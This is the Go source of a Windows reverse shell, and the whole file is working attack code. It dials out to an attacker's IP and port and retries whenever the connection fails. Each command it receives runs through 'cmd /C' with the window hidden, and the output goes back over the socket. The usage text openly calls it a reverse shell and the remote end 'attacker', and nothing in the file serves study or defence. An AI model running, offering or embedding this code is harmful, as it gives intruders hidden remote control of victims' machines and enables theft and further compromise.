package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"os/exec"
	"syscall"
	"time"
)

func main() {
	if len(os.Args) <= 1 {
		fmt.Println("This is a simple reverse shell written in Go")
		fmt.Println("--------------------------------------------")
		fmt.Println("Usage: reverse-shell.exe <IPv4 Address> <Port>")
		fmt.Println("Sample: reverse-shell.exe 192.168.1.254 443")
	} else {
		host := os.Args[1]
		port := os.Args[2]
		open(host, port)
	}
}

func open(host string, port string) {
	target := host + ":" + port
	fmt.Println("Connecting attacker " + target + " ...")
	connection, err := net.Dial("tcp", target)
	if nil != err {
		if nil != connection {
			connection.Close()
		}
		fmt.Println("Connection failed, retrying in 3 seconds ...")
		time.Sleep(3)
		open(host, port)
	}
	fmt.Println("Connection established!")
	reader := bufio.NewReader(connection)
	for {
		order, err := reader.ReadString('\n')
		if nil != err {
			connection.Close()
			fmt.Println("Connection terminated! Re-establishing connection ...")
			open(host, port)
			return
		}
		cmd := exec.Command("cmd", "/C", order)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		out, _ := cmd.CombinedOutput()
		connection.Write(out)
	}
}
